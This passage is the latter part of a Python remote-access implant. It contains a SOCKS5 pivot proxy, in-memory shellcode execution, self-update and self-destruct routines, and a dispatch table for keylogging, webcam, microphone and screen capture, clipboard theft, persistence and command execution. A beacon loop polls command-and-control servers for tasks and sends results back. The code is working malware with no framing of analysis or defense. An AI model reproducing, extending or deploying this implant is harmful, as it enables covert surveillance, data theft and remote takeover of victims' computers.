            client.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")

            def relay(src, dst):
                try:
                    while True:
                        data = src.recv(4096)
                        if not data:
                            break
                        dst.sendall(data)
                except Exception:
                    pass
                finally:
                    for s in (src, dst):
                        try:
                            s.close()
                        except Exception:
                            pass

            threading.Thread(target=relay, args=(client, remote), daemon=True).start()
            threading.Thread(target=relay, args=(remote, client), daemon=True).start()
        except Exception:
            try:
                client.close()
            except Exception:
                pass


def handle_socks_start(task):
    global _socks_server
    with _socks_lock:
        if _socks_server is not None:
            return {"ok": True,
                    "output": f"SOCKS5 already running on port {_socks_server.port}",
                    "port": _socks_server.port}
        host = task.get("host", "127.0.0.1")
        port = int(task.get("port", 1080))
        try:
            _socks_server = _Socks5Server(host, port)
            return {"ok": True,
                    "output": f"SOCKS5 listening on {host}:{_socks_server.port}",
                    "port": _socks_server.port}
        except Exception as e:
            return {"ok": False, "error": str(e)}


def handle_socks_stop(_task):
    global _socks_server
    with _socks_lock:
        if _socks_server is None:
            return {"ok": False, "error": "SOCKS5 proxy not running"}
        _socks_server.stop()
        _socks_server = None
    return {"ok": True, "output": "SOCKS5 proxy stopped"}


# ── In-memory shellcode execution (Linux only) ────────────────────────────────

def handle_exec_shellcode(task):
    if platform.system() != "Linux":
        return {"ok": False, "error": "exec_shellcode only supported on Linux"}
    raw = task.get("shellcode")
    if not raw:
        return {"ok": False, "error": "Missing shellcode field"}
    try:
        code = base64.b64decode(raw, validate=True)
    except Exception as e:
        return {"ok": False, "error": f"Invalid base64: {e}"}
    try:
        size = len(code)
        mm   = mmap.mmap(-1, size, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
        mm.write(code)
        addr = ctypes.addressof(ctypes.c_char.from_buffer(mm))
        ctypes.CFUNCTYPE(None)(addr)()
        mm.close()
        return {"ok": True, "output": f"Shellcode executed ({size} bytes)"}
    except Exception as e:
        return {"ok": False, "error": f"Shellcode execution failed: {e}"}


# ── Self-update / self-destruct ───────────────────────────────────────────────

def handle_self_update(task):
    raw = task.get("payload", "")
    try:
        new_code = base64.b64decode(raw, validate=True)
    except Exception as e:
        return {"ok": False, "error": f"Invalid base64: {e}"}

    spath = _script_path()
    try:
        with open(spath, "wb") as f:
            f.write(new_code)
    except OSError as e:
        return {"ok": False, "error": f"Write failed: {e}"}

    def _reexec():
        time.sleep(1)
        if platform.system() == "Windows":
            _DETACHED = 0x00000008
            subprocess.Popen([sys.executable, spath], creationflags=_DETACHED)
            sys.exit(0)
        else:
            os.execv(sys.executable, [sys.executable, spath])

    threading.Thread(target=_reexec, daemon=True).start()
    return {"ok": True, "output": "Script updated — re-executing in 1s"}


def handle_self_destruct(_task):
    def _destroy():
        time.sleep(1)
        handle_unpersist({})
        try:
            os.remove(_script_path())
        except Exception:
            pass
        sys.exit(0)

    threading.Thread(target=_destroy, daemon=True).start()
    return {"ok": True, "output": "Self-destruct initiated"}


# ── Dispatch table ────────────────────────────────────────────────────────────

HANDLERS = {
    "execute":        handle_execute,
    "upload":         handle_upload,
    "download":       handle_download,
    "set_interval":   handle_set_interval,
    "screenshot":     handle_screenshot,
    "webcam_snap":    handle_webcam_snap,
    "mic_record":     handle_mic_record,
    "keylog_start":   handle_keylog_start,
    "keylog_dump":    handle_keylog_dump,
    "keylog_stop":    handle_keylog_stop,
    "clipboard":      handle_clipboard,
    "persist":        handle_persist,
    "unpersist":      handle_unpersist,
    "privesc_enum":   handle_privesc_enum,
    "exec_python":    handle_exec_python,
    "self_update":    handle_self_update,
    "self_destruct":  handle_self_destruct,
    "sysinfo":        handle_sysinfo,
    "ps":             handle_ps,
    "ls":             handle_ls,
    "netstat":        handle_netstat,
    "kill_process":   handle_kill_process,
    "shell_open":     handle_shell_open,
    "shell_send":     handle_shell_send,
    "shell_close":    handle_shell_close,
    "socks_start":    handle_socks_start,
    "socks_stop":     handle_socks_stop,
    "exec_shellcode": handle_exec_shellcode,
}


# ── Beacon loop ───────────────────────────────────────────────────────────────

def register(session, base_url):
    resp = session.post(f"{base_url}/{ENDPOINT['register']}", json={
        "id":       IMPLANT_ID,
        "hostname": platform.node(),
        "user":     os.getenv("USER", "unknown"),
        "os":       f"{platform.system()} {platform.release()}",
    }, timeout=10)
    resp.raise_for_status()
    return resp.json()["id"]


def beacon_loop():
    session              = _session()
    c2_index             = 0
    consecutive_failures = 0
    implant_id           = None

    while True:
        base_url = C2_URLS[c2_index % len(C2_URLS)]

        if implant_id is None:
            try:
                implant_id = register(session, base_url)
                consecutive_failures = 0
            except (requests.exceptions.ConnectionError,
                    requests.exceptions.HTTPError):
                consecutive_failures += 1
                if len(C2_URLS) > 1 and consecutive_failures >= MAX_FAILURES_BEFORE_ROTATE:
                    c2_index += 1
                    consecutive_failures = 0
                _sleep()
            except Exception:
                _sleep()
            continue

        try:
            resp = session.get(
                f"{base_url}/{ENDPOINT['tasks']}/{implant_id}", timeout=10
            )

            if resp.status_code == 404:
                implant_id = None
                consecutive_failures = 0
                continue

            resp.raise_for_status()
            consecutive_failures = 0

            task = resp.json().get("task")
            if task:
                orig = task
                try:
                    task = _dec(task)
                except Exception:
                    task = orig

                task_type = task.get("type", "unknown")
                handler   = HANDLERS.get(task_type)
                try:
                    result = handler(task) if handler else \
                             {"ok": False, "error": f"Unknown task type: {task_type}"}
                except Exception as _e:
                    result = {"ok": False, "error": f"Handler exception: {_e}"}

                result["task_id"] = task.get("task_id")
                result["type"]    = task_type

                try:
                    session.post(
                        f"{base_url}/{ENDPOINT['results']}/{implant_id}",
                        json=_enc(result),
                        timeout=10,
                    )
                except requests.exceptions.RequestException:
                    pass

        except requests.exceptions.ConnectionError:
            consecutive_failures += 1
            if len(C2_URLS) > 1 and consecutive_failures >= MAX_FAILURES_BEFORE_ROTATE:
                c2_index += 1
                consecutive_failures = 0
                implant_id = None

        except requests.exceptions.RequestException:
            pass

        except Exception:
            pass  # never let the beacon loop die on unexpected errors

        _sleep()


if __name__ == "__main__":
    beacon_loop()
